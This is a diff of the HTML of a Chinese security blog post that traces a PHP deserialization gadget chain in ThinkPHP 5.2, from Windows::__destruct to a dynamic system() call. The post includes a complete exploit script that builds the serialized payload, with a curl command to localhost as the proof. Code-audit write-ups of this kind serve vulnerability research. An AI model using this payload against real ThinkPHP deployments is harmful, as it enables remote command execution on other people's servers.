@@ -1,601 +1,658 @@
-
-
 <!DOCTYPE html>
-<html lang="zh-CN" data-default-color-scheme=&#34;dark&#34;>
-
-
-
+<html>
 <head>
-  <meta charset="UTF-8">
-  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
-  <link rel="icon" type="image/png" href="/img/favicon.png">
-  <meta name="viewport"
-        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
-  <meta http-equiv="x-ua-compatible" content="ie=edge">
-  
-  <meta name="theme-color" content="#2f4154">
-  <meta name="description" content="">
-  <meta name="author" content="osword">
-  <meta name="keywords" content="">
-  <title>ThinkPHP 5.2反序列化 - osword&#39;s blog</title>
+    
 
-  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
+    
+
+    
 
 
-  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
-  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
 
-  
+    <meta charset="utf-8">
     
     
-      
-      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.0.0/styles/darcula.min.css" />
     
-  
+    
+    <title>ThinkPHP 5.2反序列化 | osword&#39;s blog | 小刀</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#3F51B5">
+    
+    
+    <meta name="keywords" content="代码审计">
+    <meta name="description" content="前言buuoj因为特殊原因暂时关闭了，没题刷了，那咋办嘛。最近thinkphp反序列化很火，遂补下落下的坑。 环境搭建12345# 安装composer create-project topthink&#x2F;think&#x3D;5.2.x-dev v5.2# 开启cd &#x2F;v5.2php think run  &#x2F;app&#x2F;controller&#x2F;index.php 1234567891011&lt;?phpnames">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ThinkPHP 5.2反序列化">
+<meta property="og:url" content="http://zhzhdoai.github.io/2019/10/02/ThinkPHP-5-2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.html">
+<meta property="og:site_name" content="osword&#39;s blog">
+<meta property="og:description" content="前言buuoj因为特殊原因暂时关闭了，没题刷了，那咋办嘛。最近thinkphp反序列化很火，遂补下落下的坑。 环境搭建12345# 安装composer create-project topthink&#x2F;think&#x3D;5.2.x-dev v5.2# 开启cd &#x2F;v5.2php think run  &#x2F;app&#x2F;controller&#x2F;index.php 1234567891011&lt;?phpnames">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://zhzhdoai.github.io/2019/10/02/ThinkPHP-5-2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1569945074405.png">
+<meta property="og:image" content="http://zhzhdoai.github.io/2019/10/02/ThinkPHP-5-2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1569945085568.png">
+<meta property="og:image" content="http://zhzhdoai.github.io/2019/10/02/ThinkPHP-5-2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1569945170074.png">
+<meta property="og:image" content="http://zhzhdoai.github.io/2019/10/02/ThinkPHP-5-2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1569945668458.png">
+<meta property="og:image" content="http://zhzhdoai.github.io/2019/10/02/ThinkPHP-5-2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1569946145939.png">
+<meta property="og:image" content="http://zhzhdoai.github.io/2019/10/02/ThinkPHP-5-2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1569946399566.png">
+<meta property="og:image" content="http://zhzhdoai.github.io/2019/10/02/ThinkPHP-5-2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1569946075634.png">
+<meta property="og:image" content="http://zhzhdoai.github.io/2019/10/02/ThinkPHP-5-2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1569946085684.png">
+<meta property="og:image" content="http://zhzhdoai.github.io/2019/10/02/ThinkPHP-5-2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1569946609630.png">
+<meta property="og:image" content="http://zhzhdoai.github.io/2019/10/02/ThinkPHP-5-2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1569946930286.png">
+<meta property="og:image" content="http://zhzhdoai.github.io/2019/10/02/ThinkPHP-5-2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1569947142956.png">
+<meta property="og:image" content="http://zhzhdoai.github.io/2019/10/02/ThinkPHP-5-2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1569947445551.png">
+<meta property="og:image" content="http://zhzhdoai.github.io/2019/10/02/ThinkPHP-5-2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/last.jpg">
+<meta property="article:published_time" content="2019-10-01T17:02:15.000Z">
+<meta property="article:modified_time" content="2020-05-15T08:25:48.000Z">
+<meta property="article:author" content="osword">
+<meta property="article:tag" content="代码审计">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://zhzhdoai.github.io/2019/10/02/ThinkPHP-5-2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1569945074405.png">
+    
+        <link rel="alternate" type="application/atom+xml" title="osword&#39;s blog" href="/atom.xml">
+    
+    <link rel="shortcut icon" href="/favicon.ico">
+    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
+    <script>window.lazyScripts=[]</script>
 
-  
+    <!-- custom head -->
+    
 
-
-<!-- 主题依赖的图标库，不要自行修改 -->
-
-<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_pf9vaxs7x7b.css">
-
-
-
-<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
-
-
-<link  rel="stylesheet" href="/css/main.css" />
-
-<!-- 自定义样式保持在最底部 -->
-
-
-  <script  src="/js/utils.js" ></script>
-  <script  src="/js/color-schema.js" ></script>
 <meta name="generator" content="Hexo 4.2.1"></head>
 
-
 <body>
-  <header style="height: 70vh;">
-    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
-  <div class="container">
-    <a class="navbar-brand"
-       href="/">&nbsp;<strong>Fluid</strong>&nbsp;</a>
+    <div id="loading" class="active"></div>
 
-    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
-            data-target="#navbarSupportedContent"
-            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
-      <div class="animated-icon"><span></span><span></span><span></span></div>
-    </button>
-
-    <!-- Collapsible content -->
-    <div class="collapse navbar-collapse" id="navbarSupportedContent">
-      <ul class="navbar-nav ml-auto text-center">
+    <aside id="menu" class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">osword</h5>
+          <a href="mailto:929337105@qq.com" title="929337105@qq.com" class="mail">929337105@qq.com</a>
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
         
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/">
-                <i class="iconfont icon-home-fill"></i>
-                首页
+            <li class="waves-block waves-effect">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                主页
               </a>
             </li>
-          
         
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/archives/">
-                <i class="iconfont icon-archive-fill"></i>
-                归档
+            <li class="waves-block waves-effect">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                Archives
               </a>
             </li>
-          
         
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/categories/">
-                <i class="iconfont icon-category-fill"></i>
-                分类
+            <li class="waves-block waves-effect">
+              <a href="https://zhzhdoai.github.io/"  >
+                <i class="icon icon-lg icon-友链"></i>
+                友链
               </a>
             </li>
-          
         
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/tags/">
-                <i class="iconfont icon-tags-fill"></i>
-                标签
+            <li class="waves-block waves-effect">
+              <a href="https://glotozz.github.io/" target="_blank" rel="noopener"  >
+                <i class="icon icon-lg icon-glotozz"></i>
+                Glotozz
               </a>
             </li>
-          
         
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/about/">
-                <i class="iconfont icon-user-fill"></i>
-                关于
+            <li class="waves-block waves-effect">
+              <a href="https://nikoeurus.github.io/" target="_blank" rel="noopener"  >
+                <i class="icon icon-lg icon-sommus"></i>
+                Sommus
               </a>
             </li>
-          
         
+            <li class="waves-block waves-effect">
+              <a href="https://mochazz.github.io/" target="_blank" rel="noopener"  >
+                <i class="icon icon-lg icon-mochazz@七月火"></i>
+                Mochazz 七月火
+              </a>
+            </li>
         
-          <li class="nav-item" id="search-btn">
-            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
-                class="iconfont icon-search"></i>&nbsp;</a>
-          </li>
+            <li class="waves-block waves-effect">
+              <a href="https://tea9.xyz/" target="_blank" rel="noopener"  >
+                <i class="icon icon-lg icon-tea9"></i>
+                Tea 9
+              </a>
+            </li>
         
-        
-          <li class="nav-item" id="color-toggle-btn">
-            <a class="nav-link" href="javascript:">&nbsp;<i
-                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
-          </li>
+            <li class="waves-block waves-effect">
+              <a href="https://wulidecade.cn/" target="_blank" rel="noopener"  >
+                <i class="icon icon-lg icon-Decade"></i>
+                Decade
+              </a>
+            </li>
         
       </ul>
     </div>
   </div>
-</nav>
+</aside>
 
-    <div class="banner intro-2" id="background" parallax=true
-         style="background: url('/img/default.png') no-repeat center center;
-           background-size: cover;">
-      <div class="full-bg-img">
-        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
-          <div class="container page-header text-center fade-in-up">
-            <span class="h2" id="subtitle">
-              
-            </span>
-
-            
-              <div class="mt-3">
-  
-  
-    <span class="post-meta">
-      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-      <time datetime="2019-10-02 01:02" pubdate>
-        2019年10月2日 凌晨
-      </time>
-    </span>
-  
-</div>
-
-<div class="mt-1">
-  
-    
-    <span class="post-meta mr-2">
-      <i class="iconfont icon-chart"></i>
-      641 字
-    </span>
-  
-
-  
-    
-    <span class="post-meta mr-2">
-      <i class="iconfont icon-clock-fill"></i>
-      
-      
-      9
-       分钟
-    </span>
-  
-
-  
-  
-    
-      <!-- 不蒜子统计文章PV -->
-      <span id="busuanzi_container_page_pv" style="display: none">
-        <i class="iconfont icon-eye" aria-hidden="true"></i>
-        <span id="busuanzi_value_page_pv"></span> 次
-      </span>
-    
-  
-</div>
-
-            
-          </div>
-
-          
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">ThinkPHP 5.2反序列化</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
         </div>
-      </div>
+        
+        
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
+            <i class="icon icon-lg icon-share-alt"></i>
+        </a>
+        
     </div>
-  </header>
+</header>
+<header class="content-header post-header">
 
-  <main>
-    
-      
-
-<div class="container-fluid">
-  <div class="row">
-    <div class="d-none d-lg-block col-lg-2"></div>
-    <div class="col-lg-8 nopadding-md">
-      <div class="container nopadding-md" id="board-ctn">
-        <div class="py-5" id="board">
-          <article class="post-content mx-auto" id="post">
-            <!-- SEO header -->
-            <h1 style="display: none">ThinkPHP 5.2反序列化</h1>
+    <div class="container fade-scale">
+        <h1 class="title">ThinkPHP 5.2反序列化</h1>
+        <h5 class="subtitle">
             
-            <div class="markdown-body" id="post-body">
-              <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>buuoj因为特殊原因暂时关闭了，没题刷了，那咋办嘛。最近thinkphp反序列化很火，遂补下落下的坑。</p>
-<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><pre><code class="hljs bash"><span class="hljs-comment"># 安装</span>
-composer create-project topthink/think=5.2.x-dev v5.2
-<span class="hljs-comment"># 开启</span>
-<span class="hljs-built_in">cd</span> /v5.2
-php think run</code></pre>
+                <time datetime="2019-10-01T17:02:15.000Z" itemprop="datePublished" class="page-time">
+  2019-10-02
+</time>
+
+
+            
+        </h5>
+    </div>
+
+    
+
+
+</header>
+
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#前言"><span class="post-toc-number">1.</span> <span class="post-toc-text">前言</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#环境搭建"><span class="post-toc-number">2.</span> <span class="post-toc-text">环境搭建</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#POP链分析"><span class="post-toc-number">3.</span> <span class="post-toc-text">POP链分析</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#closure参数"><span class="post-toc-number">3.1.</span> <span class="post-toc-text">$closure参数</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#EXP"><span class="post-toc-number">4.</span> <span class="post-toc-text">EXP</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#POP"><span class="post-toc-number">5.</span> <span class="post-toc-text">POP</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#参考链接"><span class="post-toc-number">6.</span> <span class="post-toc-text">参考链接</span></a></li></ol>
+        </nav>
+    </aside>
+
+
+<article id="post-ThinkPHP-5-2反序列化"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">ThinkPHP 5.2反序列化</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2019-10-02 01:02:15" datetime="2019-10-01T17:02:15.000Z"  itemprop="datePublished">2019-10-02</time>
+
+            
+
+
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
+</span>
+
+
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>buuoj因为特殊原因暂时关闭了，没题刷了，那咋办嘛。最近thinkphp反序列化很火，遂补下落下的坑。</p>
+<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安装</span></span><br><span class="line">composer create-project topthink/think=5.2.x-dev v5.2</span><br><span class="line"><span class="comment"># 开启</span></span><br><span class="line"><span class="built_in">cd</span> /v5.2</span><br><span class="line">php think run</span><br></pre></td></tr></table></figure>
 
 <p><strong>/app/controller/index.php</strong></p>
-<pre><code class="hljs xml"><span class="php"><span class="hljs-meta">&lt;?php</span></span>
-<span class="php"><span class="hljs-keyword">namespace</span> <span class="hljs-title">app</span>\<span class="hljs-title">controller</span>;</span>
-
-<span class="php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Index</span></span></span>
-<span class="php">&#123;</span>
-<span class="php">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span><span class="hljs-params">($input=<span class="hljs-string">''</span>)</span></span></span>
-<span class="php">    &#123;   </span>
-<span class="php">        <span class="hljs-keyword">echo</span> $input;</span>
-<span class="php">        unserialize($input);   </span>
-<span class="php">    &#125;</span>
-<span class="php">&#125;</span></code></pre>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace app\controller;</span><br><span class="line"></span><br><span class="line">class Index</span><br><span class="line">&#123;</span><br><span class="line">    public function index($input&#x3D;&#39;&#39;)</span><br><span class="line">    &#123;   </span><br><span class="line">        echo $input;</span><br><span class="line">        unserialize($input);   </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <h1 id="POP链分析"><a href="#POP链分析" class="headerlink" title="POP链分析"></a>POP链分析</h1><p>反序列化入口于<code>class Windows::__destruct</code></p>
-<p><img src="./1569945074405.png" srcset="/img/loading.gif" alt="1569945074405"></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="./1569945074405.png" alt="1569945074405" title="">
+                </div>
+                <div class="image-caption">1569945074405</div>
+            </figure>
+
 <p><code>file_exists</code>可以触发<code>__toString</code>魔术方法,且这里<code>$this-&gt;files</code>可控</p>
-<p><img src="./1569945085568.png" srcset="/img/loading.gif" alt="1569945085568"></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="./1569945085568.png" alt="1569945085568" title="">
+                </div>
+                <div class="image-caption">1569945085568</div>
+            </figure>
+
 <p>全局搜<code>__toString</code>,跟进<code>conversion</code>类<code>toJson</code>方法</p>
-<p><img src="./1569945170074.png" srcset="/img/loading.gif" alt="1569945170074"></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="./1569945170074.png" alt="1569945170074" title="">
+                </div>
+                <div class="image-caption">1569945170074</div>
+            </figure>
+
 <p>跟进<code>toArray</code>方法，分析方法，需要考虑</p>
 <ol>
 <li>哪些是类变量调用的参数</li>
 <li>有没有哪些类变量调用可以执行魔术方法当做跳板</li>
 </ol>
 <p>跟进<code>getAttr</code>方法，再跟进<code>getValue</code>方法。存在动态函数调用，我们去溯源下这几个参数</p>
-<pre><code class="hljs php">$closure、$value、<span class="hljs-keyword">$this</span>-&gt;data</code></pre>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$closure、$value、<span class="keyword">$this</span>-&gt;data</span><br></pre></td></tr></table></figure>
 
-<p><img src="./1569945668458.png" srcset="/img/loading.gif" alt="1569945668458"></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="./1569945668458.png" alt="1569945668458" title="">
+                </div>
+                <div class="image-caption">1569945668458</div>
+            </figure>
+
 <p>首先是<code>$value</code>参数，回到<code>Attribute</code>类<code>getAttr</code>方法，<code>$value</code>值由传入的<code>$name</code>决定且带入<code>getData</code>方法，<code>getRealFieldName</code>方法返回值又为<code>$name</code>值，接着带入<code>$this-&gt;data[$fileName]</code>。和data数组相关</p>
-<p><img src="./1569946145939.png" srcset="/img/loading.gif" alt="1569946145939"></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="./1569946145939.png" alt="1569946145939" title="">
+                </div>
+                <div class="image-caption">1569946145939</div>
+            </figure>
+
 <p>再往回看，这里<code>$key</code>值是<code>Conversion</code>类参数中<code>$this-&gt;data</code>和$<code>this-&gt;relation</code>键值可控。</p>
-<p><img src="./1569946399566.png" srcset="/img/loading.gif" alt="1569946399566"></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="./1569946399566.png" alt="1569946399566" title="">
+                </div>
+                <div class="image-caption">1569946399566</div>
+            </figure>
+
 <p>需要明白的是<code>Conversion</code>类是<code>trait</code>型，需要找到<code>use</code>它的类。定位到<code>model</code>类</p>
-<p><img src="./1569946075634.png" srcset="/img/loading.gif" alt="1569946075634"></p>
-<p><img src="./1569946085684.png" srcset="/img/loading.gif" alt="1569946085684"></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="./1569946075634.png" alt="1569946075634" title="">
+                </div>
+                <div class="image-caption">1569946075634</div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="./1569946085684.png" alt="1569946085684" title="">
+                </div>
+                <div class="image-caption">1569946085684</div>
+            </figure>
+
 <p>modle构造方法中<code>$this-&gt;data</code>值是调用该该构造方法时候传入，由于是抽象类需要找到他的子类.</p>
 <p>定位至Pivot类，这里构造方法调用了父类构造方法</p>
-<p><img src="./1569946609630.png" srcset="/img/loading.gif" alt="1569946609630"></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="./1569946609630.png" alt="1569946609630" title="">
+                </div>
+                <div class="image-caption">1569946609630</div>
+            </figure>
+
+
+
 <h2 id="closure参数"><a href="#closure参数" class="headerlink" title="$closure参数"></a>$closure参数</h2><p>至此漏洞点处的<code>$value</code>值已经分析完了，继续看漏洞点$closure参数。</p>
-<p><code>withAttr</code>为类变量可控，继续跟进<code>$fieldName</code><br><img src="./1569946930286.png" srcset="/img/loading.gif" alt="1569946930286"></p>
+<p><code>withAttr</code>为类变量可控，继续跟进<code>$fieldName</code></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="./1569946930286.png" alt="1569946930286" title="">
+                </div>
+                <div class="image-caption">1569946930286</div>
+            </figure>
+
 <p>跟进<code>getRealFieldName</code>方法，传入参数为<code>$name</code>也是可控的。该值上面已经分析了为data数组键。</p>
 <p>由于<code>$this-&gt;strict</code>为<code>true</code> 直接返回<code>$name</code>值</p>
 <p>可以这样构造。</p>
-<pre><code class="hljs php"><span class="hljs-keyword">$this</span>-&gt;withAttr = <span class="hljs-keyword">array</span>(<span class="hljs-string">"paper"</span>=&gt;<span class="hljs-string">'system'</span>); 
-=&gt; $closure=<span class="hljs-string">'system'</span>;</code></pre>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;withAttr = <span class="keyword">array</span>(<span class="string">"paper"</span>=&gt;<span class="string">'system'</span>); </span><br><span class="line">=&gt; $closure=<span class="string">'system'</span>;</span><br></pre></td></tr></table></figure>
 
-<p><img src="./1569947142956.png" srcset="/img/loading.gif" alt="1569947142956"></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="./1569947142956.png" alt="1569947142956" title="">
+                </div>
+                <div class="image-caption">1569947142956</div>
+            </figure>
+
+
+
 <h1 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h1><p>参考链接中利用了<a href="https://github.com/opis/closure" target="_blank" rel="noopener">\Opis\Closure</a>可用于序列化匿名函数</p>
 <p>这里直接用system函数</p>
-<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
-<span class="hljs-keyword">namespace</span> <span class="hljs-title">think</span>\<span class="hljs-title">process</span>\<span class="hljs-title">pipes</span> &#123;
-    <span class="hljs-title">class</span> <span class="hljs-title">Windows</span>&#123;
-        <span class="hljs-title">private</span> $<span class="hljs-title">files</span> = [];
-        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">($files)</span></span>
-<span class="hljs-function">        </span>&#123;
-            <span class="hljs-keyword">$this</span>-&gt;files = $files;
-        &#125;
-    &#125;
-&#125;
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Windows</span>&#123;</span><br><span class="line">        <span class="title">private</span> $<span class="title">files</span> = [];</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($files)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;files = $files;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">concern</span> &#123;</span><br><span class="line">    <span class="title">trait</span> <span class="title">Conversion</span>&#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">visible</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">trait</span> RelationShip&#123;</span><br><span class="line">        <span class="keyword">private</span> $relation;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">trait</span> Attribute&#123;</span><br><span class="line">        <span class="keyword">private</span> $withAttr;</span><br><span class="line">        <span class="keyword">private</span> $data;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span> &#123;</span><br><span class="line">    <span class="title">abstract</span> <span class="title">class</span> <span class="title">Model</span>&#123;</span><br><span class="line">        <span class="title">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">RelationShip</span>;</span><br><span class="line">        <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">Conversion</span>;</span><br><span class="line">        <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">Attribute</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($closure)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;data = $closure;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;relation = [];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;visible= [];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;withAttr = <span class="keyword">array</span>(<span class="string">"paper"</span>=&gt;<span class="string">'system'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Pivot</span> <span class="title">extends</span> \<span class="title">think</span>\<span class="title">Model</span>&#123;</span><br><span class="line">        <span class="title">function</span> <span class="title">__construct</span>($<span class="title">closure</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="title">parent</span>::<span class="title">__construct</span>($<span class="title">closure</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    $pivot = new think\model\Pivot(['paper'=&gt;'curl http://127.0.0.1:8897']);</span><br><span class="line">    $windows = <span class="keyword">new</span> think\process\pipes\Windows([$pivot]);</span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize($windows));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<span class="hljs-keyword">namespace</span> <span class="hljs-title">think</span>\<span class="hljs-title">model</span>\<span class="hljs-title">concern</span> &#123;
-    <span class="hljs-title">trait</span> <span class="hljs-title">Conversion</span>&#123;
-        <span class="hljs-title">protected</span> $<span class="hljs-title">visible</span>;
-    &#125;
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="./1569947445551.png" alt="1569947445551" title="">
+                </div>
+                <div class="image-caption">1569947445551</div>
+            </figure>
 
-    <span class="hljs-keyword">trait</span> RelationShip&#123;
-        <span class="hljs-keyword">private</span> $relation;
